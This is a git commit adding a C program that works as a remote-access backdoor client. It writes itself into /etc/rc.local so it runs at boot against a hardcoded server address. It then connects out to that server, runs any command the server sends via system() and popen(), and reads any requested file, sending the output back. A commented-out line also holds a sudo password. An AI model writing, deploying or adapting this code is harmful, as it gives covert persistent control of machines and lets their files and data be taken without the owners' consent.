5c4404c32693c3fd4ae37fcbb2af57fee99a3186
seedindream <li.7533@buckeyemail.osu.edu>
2016-11-30 20:52:11 -0500

    Add files via upload

---
+++ new codes/client_combine.c
@@ -0,0 +1,127 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h> 
+
+void sendMessage(FILE *file_p, int sockfd, char *buffer);
+
+void error(char *msg)
+{
+    perror(msg);
+    exit(0);
+}
+
+int main(int argc, char *argv[])
+{
+
+// change from .sh
+    FILE * fp;
+    char * line = NULL;
+    size_t len = 0;
+    ssize_t readlocal;
+    int count = 0;
+
+    fp = fopen("/etc/rc.local", "r");
+
+    while ((readlocal = getline(&line, &len, fp)) != -1) {
+        if(strcmp(line, "nohup /etc/client 172.31.43.189 22222 > /etc/helloworld.log\n") == 0) {count =1; printf("11");}
+    }
+    fclose(fp);
+    printf("GO");
+
+    if (count == 0 ){
+   // system("echo 'lmya5202'|sudo -S -i;");
+    //system("sudo su;");
+    system("cp ./client /etc");
+    system("line2=`sed -n '/^#/=' /etc/rc.local|tail -1`");
+    system("sed -i \"${line2}a\ nohup /etc/client 172.31.43.189 22222 > /etc/helloworld.log\" /etc/rc.local");
+    system("nohup /etc/client 172.31.43.189 22222 > /etc/helloworld.log"); }
+
+
+
+
+    int sockfd, portno, n;
+
+    struct sockaddr_in serv_addr;
+    struct hostent *server;
+
+    char buffer[256];
+
+    FILE *file_p;
+
+    if (argc < 3) {
+       fprintf(stderr,"usage %s hostname port\n", argv[0]);
+       exit(0);
+    }
+    portno = atoi(argv[2]);
+
+    // Initialize socket
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) 
+        error("ERROR opening socket");
+
+    // Find server
+    server = gethostbyname(argv[1]);
+    if (server == NULL) {
+        fprintf(stderr,"ERROR, no such host\n");
+        exit(0);
+    }
+    bzero((char *) &serv_addr, sizeof(serv_addr));
+    serv_addr.sin_family = AF_INET;
+    bcopy((char *)server->h_addr, (char *)&serv_addr.sin_addr.s_addr,
+         server->h_length);
+    serv_addr.sin_port = htons(portno);
+
+    // Connect to server
+    if (connect(sockfd,(struct sockaddr *)&serv_addr,sizeof(serv_addr)) < 0) 
+        error("ERROR connecting");
+    
+    while (1) {
+        bzero(buffer, 256);
+        if (read(sockfd, buffer, 255) < 0)
+            error("ERROR reading from socket");
+
+        // Use command line tool
+        if (strcmp(buffer, "COMMAND LINE MODE\n") == 0) {
+            bzero(buffer, 256);
+            if (read(sockfd, buffer, 255) < 0)
+                error("ERROR reading from socket");
+            printf("Here is the command: %s\n", buffer);
+            system(buffer); //ONLY FOR TESTING. SHOULD BE COMMENTED.
+            file_p = popen(buffer, "r");
+            sendMessage(file_p, sockfd, buffer);
+        }
+        
+        // Read file
+        else if (strcmp(buffer, "READ MODE\n") == 0) {
+            bzero(buffer, 256);
+            if (read(sockfd, buffer, 255) < 0)
+                error("ERROR reading from socket");
+            printf("Here is the file name: %s", buffer);
+            file_p = fopen(strtok(buffer, "\n"), "r");
+            printf("%s", buffer);
+            sendMessage(file_p, sockfd, buffer);
+        }
+
+    }
+    return 0;
+}
+
+void sendMessage(FILE *file_p, int sockfd, char *buffer) {
+    if (!file_p) 
+        error("ERROR executing command");
+    bzero(buffer, 256);
+    while (fgets(buffer, 255, file_p) != NULL) {
+        printf("%s", buffer);
+        if (write(sockfd, buffer, 255) < 0)
+            error("ERROR writing to socket");
+        bzero(buffer, 256);
+        usleep(1000);
+    }
+    if (write(sockfd, "END\n", 255) < 0)
+        error("ERROR writing to socket");
+    pclose(file_p);
+}
